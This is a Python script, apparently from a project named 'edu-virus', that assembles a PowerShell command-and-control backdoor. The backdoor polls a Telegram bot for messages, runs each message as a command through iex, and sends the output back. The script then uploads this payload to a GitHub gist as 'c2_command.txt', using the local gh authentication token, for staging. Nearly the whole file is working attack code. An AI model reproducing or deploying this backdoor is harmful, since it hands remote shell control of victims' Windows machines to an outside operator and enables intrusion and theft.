import urllib.request, json, subprocess, os

# Read token from binary files
with open(os.path.expanduser('~/projects/edu-virus/tok1.bin'), 'rb') as f:
    tok1 = f.read().decode()
with open(os.path.expanduser('~/projects/edu-virus/tok2.bin'), 'rb') as f:
    tok2 = f.read().decode()

TOK=*** + tok2
GIST_ID = "99a46fc04b180fffdafc03584c0d5a2e"

CMD = f'start-job -ScriptBlock {{ $TOKEN=*** $OFFSET=0; function sd($cid,$t){{try{{$b=@{{chat_id=$cid;text=$t}}|ConvertTo-Json -Compress;irm -Uri "https://api.telegram.org/bot$TOKEN/sendMessage" -Method Post -Body $b -ContentType \'application/json\' -TimeoutSec 10}}catch{{}}}}; while($true){{try{{$r=irm -Uri "https://api.telegram.org/bot$TOKEN/getUpdates?offset=$OFFSET&timeout=30" -TimeoutSec 35;if($r.result){{foreach($u in $r.result){{$OFFSET=$u.update_id+1;$cid=$u.message.chat.id;$cmd=$u.message.text.Trim();if(-not $cmd){{continue}};sd $cid "Running: $cmd";try{{$o=iex $cmd 2>&1|Out-String}}catch{{$o="ERROR: $_"}};if($o.Length -gt 3800){{$o=$o.Substring(0,3800)+\'...[TRUNCATED]\'}};sd $cid "$o"}}}}catch{{Start-Sleep 5}}}} }}'

assert TOK in CMD, "Token not in CMD!"
print(f"CMD: {len(CMD)} chars, token present: ✓")

gh_token = subprocess.check_output(['gh', 'auth', 'token']).decode().strip()
body = json.dumps({'files': {'c2_command.txt': {'content': CMD}}}).encode('utf-8')

req = urllib.request.Request(
    f'https://api.github.com/gists/{GIST_ID}',
    data=body, method='PATCH',
    headers={
        'Accept': 'application/vnd.github+json',
        'Authorization': f'Bearer {gh_token}',
        'Content-Type': 'application/json',
        'X-GitHub-Api-Version': '2022-11-28',
        'User-Agent': 'curl/8.21.0'
    }
)

resp = urllib.request.urlopen(req, timeout=15)
r = json.loads(resp.read())
print(f"HTTP {resp.status} — Updated: {r['updated_at']}")

# Verify
raw_url = r['files']['c2_command.txt']['raw_url']
content = urllib.request.urlopen(raw_url, timeout=10).read().decode()
print(f"Gist content: {len(content)} chars")
print(f"Has token: {TOK in content}")
print(f"Has start-job: {'start-job' in content}")
